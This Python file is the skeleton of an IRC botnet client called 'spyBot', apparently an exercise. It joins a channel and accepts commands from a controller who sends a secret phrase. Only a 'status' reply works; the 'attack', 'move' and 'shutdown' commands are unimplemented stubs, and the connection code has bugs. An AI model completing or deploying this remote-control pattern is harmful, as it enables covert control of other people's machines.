#!/usr/bin/env python
''' bot.py '''

import argparse
import sys
import socket

# globals
DEBUG = True
BUFFER_SIZE = 2040
CMDS = ['status', 'attack', 'move', 'quit', 'shutdown']

class Bot():
    def __init__(self, hostname, port, channel, secret_phrase):
        # init bot
        self.hostname = hostname
        self.port = port
        self.channel = '#' + channel
        self.secret_phrase = secret_phrase
        self.irc_socket = None
        self.nickname = 'spyBot'
        self.controller = None
        self.controller_nickname = None
    
    def __send_to_channel(self, msg):
        '''
        send message to bot's channel
        format PRIVMSG <#channel> :<message>
        '''
        self.__send_message('PRIVMSG ' + self.channel + ' :' + msg + '\n')
    
    def __send_to_controller(self, msg):
        '''
        send message to specific user
        format PRIVMSG <nickname> :<message>
        '''
        self.__send_message('PRIVMSG ' + self.controller_nickname + ' :' + msg + '\n')

    def __send_message(self, msg):
        '''
        send any message to irc server
        '''
        self.irc_socket.send(msg.encode('utf-8'))

    def __receive_message(self):
        '''
        receives message from IRC server and keeps 
        connection alive by responding to 'PING #' with 'PONG #'
        and finally returns message
        '''
        received_msg = self.irc_socket.recv(BUFFER_SIZE).decode().strip()
        if received_msg.find('PING') != -1:
            self.__send_message('PONG ' + received_msg.split() [1] + '\r\n')

        return received_msg

    def __connect_to_irc_server(self):
        '''
        connect to IRC server
        '''
        log('Connecting to: {}:{}'.format(self.hostname, self.port))
        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.irc_socket.connect((self.hostname, self.port))
            except:
                log('Diconnected from: {}:{}'.format(self.hostname, self.port))
            break
    
    def __authenticate(self):
        self.__send_message('USER ' + self.nickname + ' ' + self.nickname + ' ' + self.nickname + ' :\n')
        self.__send_message('NICK ' + self.nickname + '\n')
        self.__send_message('JOIN ' + self.channel + '\n')
    
    def __validate_msg(self, msg):
        '''
        format: <sender garbage> :<msg>
        <msg>: secret_phrase command args
        '''
        if not ('PRIVMSG' in msg) or not (self.channel in msg):
            return False
        
        return True

    def __handle_command(self, msg):
        _, cmd = msg.split(' :')
        
        if cmd.startswith('status'):
            self.__send_to_controller(self.nickname)
        
        elif cmd.startswith('quit'):
            raise NotImplementedError()
        
        elif cmd.startswith('shutdown'):
            raise NotImplementedError()
        
        elif cmd.startswith('attack'):
            raise NotImplementedError()
        
        elif cmd.startswith('move'):
            raise NotImplementedError()
        
        else:
            raise ValueError('Invalid command!')

    def __verify_controller(self, msg):
        '''
        authenticates the controller using secret_phrase
        format --> :Guest52!889f1007@87.98.219.117 PRIVMSG <#channel> :<msg>
        '''
        sender = msg.split(':')[1].split(' ')[0]
        list = msg.split(' :')
        secret = list[1]
        if self.secret_phrase == secret:
            self.controller = sender
            self.controller_nickname, _ = sender.split('!')
            self.controller_nickname.replace(':', '')
            log('Authenticated controller: ' + self.controller)
            return True
        else:
            log('Failed to authenticate controller: {}, using secret_phrase: {}'.format(sender, secret))
            return False

    def __update_controller_nickname(self, msg):
        '''
        update controller nickname
        '''

    def __listen(self):
        '''
        listens for commands from IRC server
        '''
        while True:
            msg = self.__receive_message()

            if not self.__validate_msg(msg):
                log('Warning: non-cotroller msg')
                continue

            if self.controller == None:
                self.__verify_controller(msg)
                continue
            
            if not msg.startswith(':' + self.controller):
                continue
            
            log(msg)
            try:
                self.__handle_command(msg)
            except ValueError as e:
                log('Error: {}'.format(e))

    def start_bot(self):
        '''
        start bot
        source: https://stackoverflow.com/questions/2968408
        '''
        self.__connect_to_irc_server()
        self.__authenticate()
        self.__listen()



def parse_args():
    '''
    Handles parsing arguments
    Reference: https://docs.python.org/3/library/argparse.h
    '''
    usage = 'python3 bot.py <hostname> <port> <channel> <secret-phrase>'
    parser = argparse.ArgumentParser(usage=usage)

    # expected arguments
    parser.add_argument(
        'hostname',
        type=str,
        help='The <hostname> specifies the IRC server\'s hostname.'
    )
    parser.add_argument(
        'port',
        type=int,
        help='The <port> specifies the port for the IRC server\'s hostname'
    )
    parser.add_argument(
        'channel',
        type=str,
        help='The <channel> specifies which IRC channel the bot will join.'
    )
    parser.add_argument(
        'secret_phrase',
        type=str,
        help='The <secret-phrase> specifies some secret text that the IRC bot will listen for.'
    )

    args = parser.parse_args()
    if args.port not in range(0, 65536):
        log('Error: port must be 0-65535.')
        parser.exit('Usage: ' + usage)

    return args

def log(msg):
    ''' Log a debug message '''
    if DEBUG:
        print(msg, file=sys.stderr)

def main():
    args = parse_args()

    # start bot
    bot = Bot(args.hostname, int(args.port), args.channel, args.secret_phrase)
    bot.start_bot()
    

if __name__ == '__main__':
    main()